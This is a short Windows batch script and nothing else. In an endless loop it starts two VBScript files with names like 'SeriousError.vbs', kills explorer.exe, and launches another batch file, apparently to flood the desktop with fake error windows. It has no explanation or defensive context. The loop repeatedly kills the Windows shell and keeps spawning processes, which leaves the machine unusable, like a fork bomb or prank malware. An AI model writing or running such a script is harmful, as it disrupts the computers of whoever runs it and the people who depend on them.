@echo off
:cool
start errorfixer.vbs
start SeriousError.vbs
taskkill /IM explorer.exe
start fixerservice.bat
goto cool